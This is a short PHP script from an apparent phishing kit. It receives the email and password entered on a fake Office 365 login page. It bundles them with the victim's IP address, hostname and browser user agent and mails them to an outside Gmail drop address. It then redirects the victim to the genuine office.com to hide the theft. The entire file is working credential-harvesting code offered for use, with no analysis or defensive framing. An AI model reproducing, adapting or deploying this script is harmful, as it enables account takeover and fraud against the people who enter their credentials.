<?php
if($_POST["email"] != "" and $_POST["psw"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------office365 Info-----------------------\n";
$message .= "Email            : ".$_POST['email']."\n";
$message .= "Password           : ".$_POST['psw']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- SHAREPOINT ONEDRIVE-------------|\n";
$send = "mxtoolzbox@gmail.com";
$subject = "Card | $ip";
{
mail("$send", "$subject", $message);   
}
$praga=rand();
$praga=md5($praga);
  header ("Location: https://www.office.com");
}else{
header ("Location: index.php");
}

?>